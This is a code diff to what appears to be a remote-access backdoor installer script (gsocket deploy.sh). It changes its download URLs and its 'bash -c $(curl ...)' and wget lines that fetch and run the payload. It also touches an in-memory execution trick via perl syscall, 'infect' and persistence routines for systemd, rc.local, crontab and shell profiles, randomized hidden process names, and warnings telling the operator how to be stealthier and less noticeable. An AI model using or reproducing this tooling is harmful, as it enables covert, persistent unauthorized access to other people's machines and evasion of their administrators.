@@ -103,10 +103,10 @@ SCRIPT_DEPLOY_NAME="y"
 # URL_BASE_CDN="https://cdn.gsocket.io"
 # URL_BASE_X="https://gsocket.io"
 
-# DEFAULT: Pure GitHub:
-# GitHub action changes this to https://gsocket.io for www deployment.
+# DEFAULT: Pure GitHub in case user uses the deploy.sh from GitHub repo.
+# GitHub Actions change the URL_BASE_* to gsocket.io when _this_ script is uploaded to gsocket.io.
 URL_BASE_CDN="https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages"
-URL_BASE_X="https://github.com/hackerschoice/binary/tree/main/gsocket"
+URL_BASE_X="https://github.com/hackerschoice/binary/raw/refs/heads/main/gsocket"
 
 # -----BEGIN deploy_server.sh HOOK-----
 # These stubs are filled out by deploy_server.sh:
@@ -142,12 +142,9 @@ ORIG_ARGS=("$@")
 	URL_BASE_X+="/${GS_BRANCH}"
 }
 URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
-URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
-[[ -n $GS_URL_BIN ]] && {
-	URL_BIN="${GS_URL_BIN}"
-	URL_BIN_FULL="$URL_BIN"
-}
-[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/${SCRIPT_DEPLOY_NAME}"
+[ -n "$GS_URL_BIN" ] && URL_BIN="${GS_URL_BIN}"
+[ -z "$GS_URL_DEPLOY" ] && GS_URL_DEPLOY="${URL_BASE_X}/${SCRIPT_DEPLOY_NAME}"
+unset URL_BASE_CDN URL_BASE_X
 
 # WEBHOOKS are executed after a successful install
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
@@ -182,8 +179,8 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 unset data
 unset msg
 
-DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
-DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
+DL_CRL="bash -c \"\$(curl -fsSL $GS_URL_DEPLOY)\""
+DL_WGT="bash -c \"\$(wget -qO-  $GS_URL_DEPLOY)\""
 
 bin_hidden_name_arr=("supervise" "restart" "usbmon" "fg" "bg")
 BIN_HIDDEN_NAME_DEFAULT="${bin_hidden_name_arr[$((RANDOM % ${#bin_hidden_name_arr[@]}))]}"
@@ -917,9 +914,6 @@ init_vars()
 		DL=("false")   # Should not happen
 	fi
 
-	# Client also uses "mini" now.
-	# [ -n "$S" ] && URL_BIN="$URL_BIN_FULL"
-
 	[ -n "$S" ] && gs_access_memexec
 	# Use HOME from /etc/passwd first
 	phome="$(grep -m1 ^"$(whoami)" /etc/passwd 2>/dev/null | cut -d: -f6)"
@@ -1123,7 +1117,6 @@ _config2bin_memexec() {
 	[[ "$src" != "$dst" ]] && return 255
 
 	GS_CONFIG_WRITE="${dst}" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3"' <"$src" &>/dev/null || return 255
-	DEBUGF "config2bin_memexec SUCCESS"
 
 	return 0
 }
@@ -1261,11 +1254,7 @@ uninstall_service()
 		systemctl disable "${sn}" 2>/dev/null
 	}
 
-	if grep -Fqm1 oneshot "${sf}" 2>/dev/null; then
-		UNINST_IS_SYSTEMD_ONESHOT=1
-	else
-		UNINST_IS_SYSTEMD_SIMPLE=1
-	fi
+	grep -Fqm1 oneshot "${sf}" 2>/dev/null || UNINST_IS_SYSTEMD_SIMPLE=1
 
 	uninstall_rm "${sf}"
 }
@@ -1361,9 +1350,9 @@ uninstall()
 
 	echo -e "${CG}Uninstall complete.${CN}"
 
-	[[ -n "$systemd_kill_cmd" ]] && {
+	[ -n "$systemd_kill_cmd" ] && {
 		systemctl daemon-reload 2>/dev/null
-		[[ -n "$UNINST_IS_SYSTEMD_SIMPLE" ]] && echo -e "--> Use ${CM}${systemd_kill_cmd}${CN} to terminate all running shells."
+		[ -n "$UNINST_IS_SYSTEMD_SIMPLE" ] && echo -e "--> Use ${CM}${systemd_kill_cmd}${CN} to terminate all running shells."
 	}
 
 	[[ ${#UNINST_PROC_HN_ARR[@]} -gt 0 ]] && {
@@ -1517,7 +1506,7 @@ exit_installed() {
 
 # Try to load a GS_SECRET
 gs_secret_reload() {
-	local load_ok fn f d
+	local fn f d
 	gs_secret_reload_systemd_infect && exit_installed
 
 	# systemd-install not found.
@@ -1541,7 +1530,6 @@ infect_bin() {
 	[[ -n "$GS_CONFIG_SECRET" ]] && {
 		GS_SECRET="$GS_CONFIG_SECRET"
 		((IS_INSTALLED+=1))
-		IS_SKIPPED=1
 		SKIP_OUT "Already infected."
 		return 200
 	}
@@ -1590,7 +1578,6 @@ install_systemd_add() {
 
 	if [[ -f "${SERVICE_FILE}" ]]; then
 		((IS_INSTALLED+=1))
-		IS_SKIPPED=1
 		systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null && IS_GS_RUNNING=1
 		IS_SYSTEMD=1
 		SKIP_OUT "${SERVICE_FILE} already exists."
@@ -1745,7 +1732,6 @@ install_system_rclocal()
 
 	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
 		((IS_INSTALLED+=1))
-		IS_SKIPPED=1
 		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
 		return	
 	fi
@@ -1780,7 +1766,6 @@ install_user_crontab()
 	[ -z "$CRONTAB_LINE" ] && { SKIP_OUT; return ; }
 	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
 		((IS_INSTALLED+=1))
-		IS_SKIPPED=1
 		SKIP_OUT "Already installed in crontab."
 		return
 	fi
@@ -1813,7 +1798,6 @@ install_user_profile()
 	echo -en "Installing access via ~/${rc_filename_status:0:15}..............................."
 	if [[ -f "${rc_file}" ]] && grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
 		((IS_INSTALLED+=1))
-		IS_SKIPPED=1
 		SKIP_OUT "Already installed in ${rc_file}"
 		return
 	fi
@@ -2018,7 +2002,7 @@ test_network()
 	# 2. Exit=202 after n seconds. Firewalled/DNS?
 	# 3. Exit=203 if TCP to GSRN is refused.
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_CONFIG_READ=0 GS_SECRET="${GS_SECRET:?}" GS_ARGS="-t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN_EXEC_ARR[@]}" 2>&1)
+	err_log="$(_GSOCKET_SERVER_CHECK_SEC=15 GS_CONFIG_READ=0 GS_ARGS="-t -s ${GS_SECRET:?}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN_EXEC_ARR[@]}" 2>&1)"
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
@@ -2348,9 +2332,23 @@ gs_start
 # Give gsnc enough time to read the configuration from its own binary before deleting.
 [[ -n "$GS_NOINST" ]] && { sleep 1; rm -f "${DSTBIN:?}"; }
 
-echo -e "--> ${CW}Join us - https://thc.org/ops${CN}"
-
 # Default values are known and easily detected by users/admins.
-{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "Using default names is easily detectable.\n             Set ${CB}GS_BIN=<filename>${CN} and ${CDC}GS_NAME=<processname>${CN} instead."
+{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "Using default names is easily detectable. Set these for more stealth
+    ${CB}GS_BIN='<filename>'${CN}
+    ${CDC}GS_NAME='<processname>'${CN}"
+[[ "$GS_URL_DEPLOY" == "https://gsocket.io"* ]] || true && {
+	unset str
+	url="https://github.com/hackerschoice/binary/raw/refs/heads/main/gsocket"
+	[ -n "$GS_BRANCH" ] && url+="/$GS_BRANCH"
+	# [ -n "$GS_HOST" ] && str+="GS_HOST=$GS_HOST "
+	# [ -n "$GS_PORT" ] && str+="GS_PORT=$GS_PORT "
+	# [ -n "$GS_BEACON" ] && str+="GS_BEACON=$GS_BEACON "
+	# [ -n "$X" ] && str+="X=$X "
+	WARN "Using ${CY}${CF}https://gsocket.io/y${CN} is noticeable. Better use
+    ${CM}${str}bash -c \"\$(curl -fsSL ${url}/${SCRIPT_DEPLOY_NAME})\"${CN}
+    ${CM}${str}bash -c \"\$(wget -qO-  ${url}/${SCRIPT_DEPLOY_NAME})\"${CN}"
+}
+
+echo -e "--> ${CW}Join us - https://thc.org/ops${CN}"
 
 exit_code 0
